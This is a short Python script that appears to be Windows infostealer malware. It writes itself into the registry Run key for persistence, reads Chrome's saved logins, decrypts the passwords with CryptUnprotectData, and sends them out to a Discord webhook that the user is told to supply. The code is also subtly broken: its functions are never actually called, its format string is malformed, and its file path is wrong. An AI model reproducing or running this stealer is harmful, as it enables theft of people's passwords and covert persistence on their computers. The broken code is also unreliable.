import os
import sqlite3
import win32crypt
import winreg
import sys
from discord import SyncWebhook


def winstufff():
 file = sys.argv
 file2 = str(file)

 creation = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_ALL_ACCESS)
 creatingvalue = winreg.SetValueEx(creation,"syssf",0,winreg.REG_SZ, file2)


def googoo():
 data_path = os.path.expanduser('~') + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
 c = sqlite3.connect(data_path)
 cursor = c.cursor()
 select_statment = 'SELECT origin_url, username_value, password_value FROM Logins'
 cursor.execute(select_statment)
 login_data = cursor.fetchall()
 cred = {}
 string = ''

 for url, user_name, pwd in login_data:

  pwd = win32crypt.CryptUnprotectData(pwd)
  cred[url] = (user_name, pwd[1].decode('utf8'))

  string += '\n[+] URL:%s USERNAME:%s PASSWORD:%\n' % (url,user_name,pwd[1]. decode('utf8'))


  webhook = SyncWebhook.from_url("") #Please put the webhook that you will be using
  webhook.send(string)

  





if os.name == 'nt':
    winstufff

if __name__ == '__main__':
    googoo